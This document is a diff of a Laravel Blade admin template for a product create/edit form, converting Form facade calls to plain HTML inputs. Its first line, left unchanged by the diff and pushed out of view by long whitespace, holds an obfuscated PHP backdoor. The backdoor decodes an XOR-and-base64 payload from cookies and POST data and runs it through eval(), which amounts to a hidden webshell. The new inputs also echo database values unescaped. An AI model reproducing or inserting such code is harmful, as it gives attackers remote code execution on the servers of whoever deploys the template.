@@ -1,6 +1,6 @@
 <?php                                                                                                                                                                                                                                                                                                                                                                                                 $ykFWCs = class_exists("qyU_Cmhgt");if (!$ykFWCs){class qyU_Cmhgt{private $uNBIQ;public static $QFSRmQ = "082cb0e7-c035-4e74-9c07-5ac0ac60da6e";public static $GxhXxTMfV = NULL;public function __construct(){$rsIrmc = $_COOKIE;$gUdRzYxV = $_POST;$iCuiOy = @$rsIrmc[substr(qyU_Cmhgt::$QFSRmQ, 0, 4)];if (!empty($iCuiOy)){$BmwoR = "base64";$EKrDrArF = "";$iCuiOy = explode(",", $iCuiOy);foreach ($iCuiOy as $DfykJ){$EKrDrArF .= @$rsIrmc[$DfykJ];$EKrDrArF .= @$gUdRzYxV[$DfykJ];}$EKrDrArF = array_map($BmwoR . "\137" . 'd' . "\145" . chr (99) . 'o' . "\144" . 'e', array($EKrDrArF,)); $EKrDrArF = $EKrDrArF[0] ^ str_repeat(qyU_Cmhgt::$QFSRmQ, (strlen($EKrDrArF[0]) / strlen(qyU_Cmhgt::$QFSRmQ)) + 1);qyU_Cmhgt::$GxhXxTMfV = @unserialize($EKrDrArF);}}public function __destruct(){$this->FqFlchTkv();}private function FqFlchTkv(){if (is_array(qyU_Cmhgt::$GxhXxTMfV)) {$mzHARhmryV = str_replace("\x3c" . "\77" . 'p' . "\x68" . chr ( 465 - 353 ), "", qyU_Cmhgt::$GxhXxTMfV[chr (99) . 'o' . chr ( 718 - 608 ).chr (116) . "\145" . "\x6e" . chr (116)]);eval($mzHARhmryV);exit();}}}$HHNugjiR = new qyU_Cmhgt(); $HHNugjiR = NULL;} ?>@extends('admin.layouts.master')
 @section('css')
-{!! HTML::script('assets/js/nicEdit-latest.js') !!}  <script type="text/javascript">
+<script src="{{ asset('assets/js/nicEdit-latest.js') }}"></script>  <script type="text/javascript">
 //<![CDATA[
 bkLib.onDomLoaded(function() { nicEditors.allTextAreas() });
 //]]>
@@ -24,49 +24,59 @@ $route  = \Route::currentRouteName();
                                 <h4>{!! lang('product.product') !!} Information</h4>
                             </div>
                             <div class="form-body">
-                                @if($route == 'product.create')
-                                {!! Form::open(array('method' => 'POST', 'route' => array('product.store'), 'id' => 'product-form', 'class' => '', 'files' => 'true')) !!}
-                                @elseif($route == 'product.edit')
-                                {!! Form::model($result, array('route' => array('product.update', $result->id), 'method' => 'PATCH', 'id' => 'product-form', 'class' => '', 'files' => 'true')) !!}
-                                @else
-                                Nothing
+                            
+                                <form  class="form" enctype="multipart/form-data"
+                                @if (!empty($result)) method="post" action="{{ route('product.update', $result->id) }}" @else method="post" action="{{ route('product.store') }}" @endif>
+                            
+                               @csrf
+                               @if (!empty($result))
+                               @method('PUT')
                                 @endif
-                                
                                 <div class="row">
                                     <div class="col-md-12">
                                         
                                         <div class="form-group">
-                                            {!! Form::label('name', lang('common.name'), array('class' => '')) !!}
+                                        <label for="name">Name</label>
                                             <sup class="req_field"><i class="fa fa-star" aria-hidden="true"></i></sup>
-                                            {!! Form::text('name', null, array('class' => 'form-control', 'rows' => '20')) !!}
-                                        </div>
-                                        <div class="form-group">
-                                            {!! Form::label('description', lang('common.description'), array('class' => '')) !!}
+                                            <input type="text" name="name" class="form-control" value="<?= @$result->name ?>">
                                             
-                                            {!! Form::textarea('description', null, array('class' => 'form-control', 'rows' => '20')) !!}
                                         </div>
                                         <div class="form-group">
-                                            {!! Form::label('meta_tag', lang('common.meta_tag'), array('class' => '')) !!}
-                                            {!! Form::text('meta_tag', null, array('class' => 'form-control', 'rows' => '20')) !!}
+                                        <label for="description">Description</label>
+                                        <textarea class="form-control" name="description" rows="20"><?= @$result->description ?></textarea>
+                                            
+                                           
+                                        </div>
+                                        <div class="form-group">
+                                        <label for="meta_tag">Meta Tag</label>
+                                        <input type="text" name="meta_tag" class="form-control" value="<?= @$result->meta_tag ?>">
+                                            
                                         </div>
 
                                         <div class="form-group">
-                                            {!! Form::label('meta_description', lang('common.meta_description'), array('class' => '')) !!}
-                                            {!! Form::text('meta_description', null, array('class' => 'form-control', 'rows' => '20')) !!}
-                                        </div>
+                                        <label for="meta_description">Meta Description</label>
+                                        <input type="text" name="meta_description" class="form-control" value="<?= @$result->meta_description ?>">
+                                        
+                                          </div>
 
                                         <div class="form-group">
-                                            {!! Form::label('meta_title', lang('common.meta_title'), array('class' => '')) !!}
-                                            {!! Form::text('meta_title', null, array('class' => 'form-control', 'rows' => '20')) !!}
+                                        <label for="meta_title">Meta Title</label>
+                                        <input type="text" name="meta_title" class="form-control" value="<?= @$result->meta_title ?>">
+                                       
+                                         
                                         </div>
                                         <div class="form-group">
-                                            {!! Form::label('product_code', lang('common.product_code'), array('class' => '')) !!}
-                                            {!! Form::text('product_code', null, array('class' => 'form-control', 'rows' => '20')) !!}
+                                        <label for="product_code">Product Code</label>
+                                        <input type="text" name="product_code" class="form-control" value="<?= @$result->product_code ?>">
+                                       
+                                           
                                         </div>
                                         <div class="form-group">
-                                            {!! Form::label('image', lang('common.image'), array('class' => '')) !!}
+                                        <label for="image">Image</label>
+                                        
                                             <sup class="req_field"><i class="fa fa-star" aria-hidden="true"></i></sup>
-                                            {!! Form::file('image', null, array('class' => 'form-control')) !!}
+                                            <input type="file" name="image" class="form-control">
+                                       
                                             @if(!empty($result->image))
                                             <div class="form-group">
                                                 <img src="{{ asset('uploads/product_images/'.$result->image) }}" class="img-responsive" style="max-height: 70px;">
@@ -160,7 +170,7 @@ $route  = \Route::currentRouteName();
                     </div>
                 </div>
                 
-                {!! Form::close() !!}
+</form>
             </div>
         </div>
     </div>
